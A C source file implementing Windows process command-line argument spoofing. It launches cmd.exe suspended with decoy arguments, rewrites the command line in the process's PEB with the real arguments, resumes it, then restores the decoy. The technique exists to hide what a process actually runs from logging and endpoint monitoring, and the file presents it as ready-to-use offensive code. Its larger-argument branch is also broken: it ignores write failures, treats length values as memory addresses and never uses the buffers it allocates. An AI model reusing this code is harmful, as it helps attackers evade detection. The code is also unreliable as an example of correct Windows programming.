#include <windows.h>
#include <winternl.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef __kernel_entry NTSTATUS(*NtQueryInformationProcessType)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
);

DWORD CreateSuspendedProcess(
    CONST PWCHAR Exe,
    CONST PWCHAR FakeArgs,
    STARTUPINFOW* StartupInfo,
    PROCESS_INFORMATION* ProcessInfo
)
{
    if (!CreateProcessW(
        Exe,
        FakeArgs,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        StartupInfo,
        ProcessInfo))
    {
        return GetLastError();
    }

    return ERROR_SUCCESS;
}

DWORD QueryProcessInfo(
    HANDLE hProcess,
    NtQueryInformationProcessType pNtQueryInformationProcess,
    PROCESS_BASIC_INFORMATION* ProcessBasicInfo
)
{
    NTSTATUS Status = pNtQueryInformationProcess(
        hProcess,
        (PROCESSINFOCLASS)0,
        ProcessBasicInfo,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );

    if (!NT_SUCCESS(Status))
    {
        return ERROR_INVALID_PARAMETER;
    }

    if (!ProcessBasicInfo->PebBaseAddress)
    {
        return ERROR_NOT_FOUND;
    }

    return ERROR_SUCCESS;
}

DWORD ModifyArguments(
    HANDLE hProcess,
    PVOID PebBaseAddress,
    CONST PWCHAR RealArgs
) {
    SIZE_T BytesRead = 0, BytesWritten = 0;
    SIZE_T NewArgLen = 0, OldArgLen = 0;
    PEB LocalPeb = { 0 };
    RTL_USER_PROCESS_PARAMETERS LocalProcessParameters = { 0 };
    BOOL OK = FALSE;

    // Read the original PEB
    OK = ReadProcessMemory(
        hProcess,
        PebBaseAddress,
        &LocalPeb,
        sizeof(LocalPeb),
        &BytesRead
    );
    if (!OK) return GetLastError();

    // Read the original process parameters
    OK = ReadProcessMemory(
        hProcess,
        LocalPeb.ProcessParameters,
        &LocalProcessParameters,
        sizeof(LocalProcessParameters),
        &BytesRead
    );
    if (!OK) return GetLastError();

    OldArgLen = LocalProcessParameters.CommandLine.MaximumLength;
    NewArgLen = wcslen(RealArgs) * sizeof(WCHAR);

    if (NewArgLen <= OldArgLen) {
        // If new args fit in old args, just overwrite
        OK = WriteProcessMemory(
            hProcess,
            LocalProcessParameters.CommandLine.Buffer,
            RealArgs,
            NewArgLen,
            &BytesWritten
        );
        if (!OK) return GetLastError();
    }
    else {
        // Allocate new buffers
        PVOID NewArgs = (PWCHAR)VirtualAllocEx(
            hProcess,
            NULL,
            NewArgLen + 0xF,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (!NewArgs) return GetLastError();

        PVOID NewCommandLine = (PUNICODE_STRING)VirtualAllocEx(
            hProcess,
            NULL,
            sizeof(UNICODE_STRING),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (!NewCommandLine) return GetLastError();

        WriteProcessMemory(
            hProcess,
            LocalProcessParameters.CommandLine.Buffer,
            RealArgs,
            NewArgLen,
            &BytesWritten
        );

        if (!OK) return GetLastError();

        // Write the new size
        WriteProcessMemory(
            hProcess,
            (PVOID)LocalProcessParameters.CommandLine.Length,
            &NewArgLen,
            sizeof(USHORT),
            &BytesWritten
        );

        if (!OK) return GetLastError();

        // Write the new max size
        NewArgLen += 0xF;
        WriteProcessMemory(
            hProcess,
            (PVOID)LocalProcessParameters.CommandLine.MaximumLength,
            &NewArgLen,
            sizeof(USHORT),
            &BytesWritten
        );

        if (!OK) return GetLastError();
    }

    return ERROR_SUCCESS;
}

FARPROC GetNtQueryInformationProcess()
{
    HMODULE hNtdll = GetModuleHandle(L"ntdll");
    if (!hNtdll) return NULL;

    return GetProcAddress(hNtdll, "NtQueryInformationProcess");
}

DWORD SpawnWithSpoofedArgs(
    CONST PWCHAR Exe,
    CONST PWCHAR FakeArgs,
    CONST PWCHAR RealArgs,
    PHANDLE OutHandle)
{
    DWORD                           Status                      = NULL;
    HANDLE                          hProcess                    = NULL;
    NtQueryInformationProcessType   pNtQueryInformationProcess  = NULL;
    STARTUPINFOW                    StartupInfo                 = { NULL };
    PROCESS_INFORMATION             ProcessInfo                 = { NULL };
    PROCESS_BASIC_INFORMATION       ProcessBasicInfo            = { NULL };

    if (!Exe || !FakeArgs || !RealArgs) return ERROR_INVALID_PARAMETER;

    pNtQueryInformationProcess = (NtQueryInformationProcessType)
        GetNtQueryInformationProcess();

    if (!pNtQueryInformationProcess) return ERROR_NOT_FOUND;

    // Create suspended process
    Status = CreateSuspendedProcess(Exe, FakeArgs, &StartupInfo, &ProcessInfo);
    if (Status != ERROR_SUCCESS)
    {
        return Status;
    }

    hProcess = ProcessInfo.hProcess;
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) return ERROR_CREATE_FAILED;

    if (!ProcessInfo.hThread || ProcessInfo.hThread == INVALID_HANDLE_VALUE)
        return ERROR_CREATE_FAILED;

    // Get PEB address
    Status = QueryProcessInfo(hProcess, pNtQueryInformationProcess, &ProcessBasicInfo);
    if (Status != ERROR_SUCCESS)
    {
        CloseHandle(hProcess);
        return Status;
    }

    // Spoof arguments
    Status = ModifyArguments(hProcess, ProcessBasicInfo.PebBaseAddress, RealArgs);
    if (Status != ERROR_SUCCESS)
    {
        CloseHandle(hProcess);
        return Status;
    }

    // Resume main thread
    Status = ResumeThread(ProcessInfo.hThread);
    if (Status == (DWORD)-1)
    {
        CloseHandle(hProcess);
        return GetLastError();
    }

    // Overwrite the arguments with the spoof
    Status = ModifyArguments(hProcess, ProcessBasicInfo.PebBaseAddress, FakeArgs);
    if (Status != ERROR_SUCCESS)
    {
        CloseHandle(hProcess);
        return Status;
    }


    *OutHandle = hProcess;
    return ERROR_SUCCESS;
}


INT main()
{
    DWORD   Status      = NULL;
    HANDLE  hProcess    = NULL;

    Status = SpawnWithSpoofedArgs(
        (CONST PWCHAR)L"C:\\Windows\\System32\\cmd.exe",
        (CONST PWCHAR)L"Spoofed",
        (CONST PWCHAR)L"notepad.exe\0\0",
        &hProcess
    );

    TerminateProcess(hProcess, ERROR_SUCCESS);

    return Status;
}

